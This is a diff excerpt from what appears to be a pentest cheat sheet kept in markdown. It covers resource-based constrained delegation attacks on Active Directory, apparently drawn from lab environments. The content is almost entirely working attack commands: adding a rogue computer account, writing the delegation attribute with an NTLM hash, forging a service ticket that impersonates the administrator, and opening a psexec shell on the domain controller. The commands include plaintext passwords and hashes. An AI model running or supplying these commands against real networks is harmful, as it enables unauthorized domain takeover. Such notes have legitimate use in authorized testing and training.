@@ -1673,13 +1673,11 @@ ls \\msdsspn_fqdn\c$
 ```bash
 impacket-addcomputer -computer-name 'TEST$' -computer-pass 'Pass12345!' -dc-ip 10.129.205.35 resourced.local/rbcd_user
 
-wget https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py
-python3 rbcd.py -dc-ip 192.168.171.175 -t DC01 -f 'TEST' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
-impacket-getST -spn cifs/DC01.resourced.local resourced.local/TEST\$:'Pass12345!' -impersonate administrator -dc-ip 192.168.171.175
-export KRB5CCNAME=./Administrator.ccache
+impacket-rbcd -dc-ip 172.19.99.10 -delegate-from 'TEST$' -delegate-to 'TARGET$' -action 'write' -hashes :bb73d5056f1f2084e5b5bbe18261f6b6 'INLANEFREIGHT.local/TANGUI'
+impacket-getST -spn cifs/DC01.resourced.local resourced.local/'TEST$':'Pass12345!' -impersonate administrator -dc-ip 192.168.171.175
 
 # vim /etc/hosts DC01 (SPN)
-impacket-psexec -k -no-pass resourced.local/administrator@DC01.resourced.local
+KRB5CCNAME=./Administrator.ccache impacket-psexec -k -no-pass resourced.local/administrator@DC01.resourced.local
 ```
 
 #### nopac
